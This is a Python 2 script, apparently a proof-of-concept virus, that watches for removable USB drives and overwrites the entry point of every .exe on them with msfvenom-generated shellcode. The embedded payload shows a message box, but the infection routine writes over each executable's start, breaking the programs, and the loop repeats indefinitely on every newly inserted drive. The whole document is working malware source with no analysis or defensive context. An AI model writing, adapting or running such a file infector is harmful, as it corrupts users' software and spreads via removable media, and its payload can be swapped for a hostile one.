import win32api, os, win32file, pefile, time

# msfvenom -p windows/messagebox -f py
buf = ""
buf += "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
buf += "\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
buf += "\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
buf += "\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
buf += "\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
buf += "\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
buf += "\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
buf += "\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
buf += "\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
buf += "\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
buf += "\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
buf += "\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
buf += "\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
buf += "\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
buf += "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
buf += "\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
buf += "\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
buf += "\x24\x0a\x89\xe3\x68\x58\x20\x20\x20\x68\x4d\x53\x46"
buf += "\x21\x68\x72\x6f\x6d\x20\x68\x6f\x2c\x20\x66\x68\x48"
buf += "\x65\x6c\x6c\x31\xc9\x88\x4c\x24\x10\x89\xe1\x31\xd2"
buf += "\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08" #1

def infecta(arquivos): #2
    for arquivo in arquivos: #3
        try: #4
            #Fonte: http://breakinsecurity.com/pe-format-manipulation-with-pefile
            pe = pefile.PE(arquivo)
            ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
            print "[*] Writting %d bytes at offset %s" % (len(buf), hex(ep))
            pe.set_bytes_at_offset(ep, buf)
            pe.write(arquivo)
        except:
            pass

def lista_exe(driver): #5
    for arquivos in os.walk(driver+':'): #6
        for arquivo in arquivos[2]: #7
            if os.path.splitext(arquivo)[1] == '.exe': #8
                yield arquivos[0] + '\\' + arquivo #9

lista_pendrive_infectado = [] #10
listaDriversAntigos = win32api.GetLogicalDriveStrings() #11

while True: #12
    listaDrivers = win32api.GetLogicalDriveStrings() #13

    if listaDriversAntigos != listaDrivers: #14
        for driver in listaDrivers: #15
            if driver in lista_pendrive_infectado and driver not in listaDriversAntigos: #16
                lista_pendrive_infectado.remove(driver) #17
        listaDriversAntigos = listaDrivers #18

    for driver in listaDrivers: #19
        if driver not in lista_pendrive_infectado: #20
            if win32file.GetDriveType(driver + ':') ==  2: #21
                infecta(lista_exe(driver)) #22
                lista_pendrive_infectado += driver #23

    time.sleep(0.3) #24